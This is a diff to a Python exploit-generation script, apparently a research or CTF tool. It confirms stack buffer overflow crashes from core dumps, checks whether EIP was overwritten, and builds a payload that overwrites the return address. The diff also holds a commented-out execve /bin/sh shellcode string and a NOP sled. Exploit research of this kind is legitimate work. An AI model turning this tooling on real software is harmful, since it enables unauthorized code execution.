@@ -3,7 +3,6 @@ from utils import build_command, interactive_gdb
 from exploit_utils import ENV_VARS
 import argparse
 import glob
-import tempfile
 
 
 def reproducer(crash_input: bytes, arg_config: argparse.Namespace) -> bool:
@@ -44,18 +43,18 @@ def reproducer(crash_input: bytes, arg_config: argparse.Namespace) -> bool:
     rep_proc.communicate(input=crash_input)
 
     if rep_proc.returncode == -11:  #segfault
-        core_path = f"/core_dumps/core.{target_bin}.{rep_proc.pid}"
+        core_path = f'/core_dumps/core.{target_bin}.{rep_proc.pid}'
 
         if os.path.isfile(core_path):
             os.remove(core_path)
             return True
 
         else:
-            logging.error("Core dump is missing; Something went wrong.")
+            logging.error('Core dump is missing; Something went wrong.')
             sys.exit(1)
 
     else:
-        logging.error("No memory corruption crash detected")
+        logging.error('No memory corruption crash detected')
         sys.exit(1)
 
 
@@ -74,6 +73,7 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace) -> b
     """
 
     #performs the crash 
+
     target_bin = arg_config.target
 
     command = build_command(arg_config, crash_input)
@@ -98,17 +98,19 @@ def root_cause_analysis(crash_input: bytes, arg_config: argparse.Namespace) -> b
         return None
 
     core_files = glob.glob(f'/core_dumps/core.{arg_config.target}.*')
-    core_path = f"/core_dumps/core.{target_bin}.{crash_proc.pid}"
+    core_path = f'/core_dumps/core.{target_bin}.{crash_proc.pid}'
 
     if core_path not in core_files:
         logging.error('in root cause analysis, previous crash did not cause a core dump')
         sys.exit(1)
     
+    # interactive_gdb(target_bin, core_path, ENV_VARS)
     core = Corefile(core_path)
     eip = core.eip.to_bytes(4, byteorder='little')
 
     #if the value of the eip belongs to the crash input, it means it was overwritten by the crash input and the payload reached the return address
-    if eip in crash_input:    
+    if eip in crash_input:  
+        # interactive_gdb(target_bin, core_path, ENV_VARS)  
         return True
 
     #eip still has a valid value, so it wasn't overwritten by the payload. The program prematurely crashed and it did not reach the return address
@@ -130,27 +132,27 @@ def crash_explorer(crash_input: bytes, arg_config: argparse.Namespace):
 
     core = Corefile(core_path)
     eip = core.eip.to_bytes(4, byteorder='little')
-    print(f'value of eip: {eip} ')
+    # print(f'value of eip: {eip} ')
     for register in core.registers:
 
         reg_value = core.registers[register].to_bytes(4, byteorder='little')
 
         if reg_value in crash_input:
-            print(f'{register} crashed with input bytes {reg_value}')
+            # print(f'{register} crashed with input bytes {reg_value}')
 
             #strategy on picking valid addresses that will later align with the jump addr??????
             stack_addr = (core.stack.start + core.stack.stop) // 2
             stack_addr += 4
             # print(f'stack base: {stack_base}, stack limit: {stack_limit}, stack middle: {hex(middle)}')
             # target = b'\xd0\xd0\xff\xff'
-            target = struct.pack("<I", stack_addr)
-            print(f'target: {target}')
+            target = struct.pack('<I', stack_addr)
+            # print(f'target: {target}')
 
             payload_mutation = crash_input.replace(reg_value, target)
             # print(f'payload mutation {payload_mutation}')
 
 
-    print(f'payload mutation {payload_mutation}')
+    # print(f'payload mutation {payload_mutation}')
     return payload_mutation
 
 
@@ -163,17 +165,17 @@ def payload_builder(crash_input: bytes, target_bin: str) -> None:
     Parameters:
     crash_input: Input that previously crashed the target binary by successfully overwriting the return address.
     target_bin: The binary file we want to exploit.
-
     """
 
     target_address = target_ra(target_bin)
     # shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
 
-    payload = overwrite_ra(crash_input, target_bin, struct.pack("<I", target_address))
+    payload = overwrite_ra(crash_input, target_bin, struct.pack('<I', target_address))
     # payload += b'\x90' * 129000
     # payload += shellcode
 
-    open("payload", "wb").write(payload)
+    # print(f'payload: {payload}')
+    open('payload', 'wb').write(payload)
 
     return
 
